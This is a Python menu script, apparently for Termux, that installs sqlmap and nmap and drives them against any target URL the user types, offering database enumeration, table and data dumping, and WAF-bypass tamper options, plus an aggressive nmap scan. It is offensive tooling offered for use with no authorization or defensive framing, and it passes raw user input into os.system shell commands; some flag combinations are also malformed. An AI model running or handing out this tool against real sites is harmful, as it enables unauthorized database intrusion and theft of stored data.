import os

def install_sqlmap():
    # Check if sqlmap is installed
    if not os.path.exists("sqlmap"):
        print("Installing sqlmap...")
        os.system("git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git")
    else:
        print("sqlmap is already installed.")

def install_nmap():
    # Check if nmap is installed
    if not os.path.exists("/usr/bin/nmap"):
        print("Installing nmap...")
        os.system("pkg install nmap")
    else:
        print("nmap is already installed.")

def sql_injection():
    print("\n--- SQL Injection Menu ---")
    print("1. Enumerate databases")
    print("2. Dump tables from a specific database")
    print("3. Dump data from a specific table")
    print("4. List columns from a specific table")
    print("5. Bypass WAF and perform SQL injection")
    print("6. Go back")

    choice = input("Enter your choice: ")

    target_url = input("Enter the target URL: ")

    if choice == '1':
        os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} --dbs")
    elif choice == '2':
        database_name = input("Enter the database name: ")
        os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} -D {database_name} --tables")
    elif choice == '3':
        database_name = input("Enter the database name: ")
        table_name = input("Enter the table name: ")
        os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} -D {database_name} -T {table_name} --dump")
    elif choice == '4':
        database_name = input("Enter the database name: ")
        table_name = input("Enter the table name: ")
        os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} -D {database_name} -T {table_name} --columns")
    elif choice == '5':
        print("\n--- WAF Bypass Techniques ---")
        print("1. Between Random Case")
        print("2. Random Comments")
        print("3. Delay")
        print("4. Random Agent and Hex Encoding")
        print("5. Comment Bypass")
        print("6. Second Order SQL Injection")
        print("7. Custom Headers")
        print("8. All Techniques (Bypass All)")
        bypass_choice = input("Enter your WAF bypass choice: ")

        waf_bypass_options = {
            '1': "--tamper=between,randomcase",
            '2': "--tamper=randomcomments",
            '3': "--delay=10",
            '4': "--random-agent --hex",
            '5': "--comment",
            '6': "--second-url",
            '7': "--headers",
            '8': "--random-agent --hex --comment --tamper=between,randomcase --tamper=randomcomments --delay=10 --second-url --headers"
        }

        if bypass_choice in waf_bypass_options:
            if bypass_choice == '7':
                custom_headers = input("Enter custom headers (format: header1:value1,header2:value2,...): ")
                os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} --dbs {waf_bypass_options[bypass_choice]}='{custom_headers}'")
            elif bypass_choice == '8':
                os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} --dbs {waf_bypass_options[bypass_choice]}")
            else:
                os.system(f"cd sqlmap && python3 sqlmap.py -u {target_url} --dbs {waf_bypass_options[bypass_choice]}")
        else:
            print("Invalid choice!")
    elif choice == '6':
        return
    else:
        print("Invalid choice!")

def vulnerability_scanner():
    print("\n--- Advanced URL Scanner ---")
    target_url = input("Enter the target URL: ")
    os.system(f"nmap -A {target_url}")

def main():
    install_sqlmap()
    install_nmap()
    
    while True:
        print("\n--- Main Menu ---")
        print("1. Perform SQL Injection")
        print("2. Perform Advanced URL Scan")
        print("3. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            sql_injection()
        elif choice == '2':
            vulnerability_scanner()
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice!")

if __name__ == "__main__":
    main()